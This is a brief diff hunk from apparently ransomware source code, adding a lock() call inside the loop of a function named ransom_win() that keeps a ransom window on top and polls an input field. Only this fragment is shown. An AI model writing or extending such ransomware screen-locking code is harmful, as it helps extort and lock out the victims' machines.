@@ -29,6 +29,7 @@ def ransom_win():
     wa.call('wm', 'attributes', '.', '-topmost', '1')
     while 1:
         wa.update()
+        lock()
         sleep(2)
         a_field = get(final.active_field)
         if a_field == "0":
